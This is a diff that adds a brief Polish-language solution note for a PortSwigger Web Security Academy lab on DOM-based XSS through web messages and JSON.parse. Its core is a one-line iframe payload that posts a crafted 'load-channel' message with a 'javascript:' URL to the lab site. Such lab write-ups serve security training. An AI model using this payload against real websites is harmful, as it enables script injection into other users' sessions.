@@ -1,0 +1,5 @@
+Analizujemy kod na stronie (printscreen) i dopasowujemy kod w iframe.
+
+<iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+
+(https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
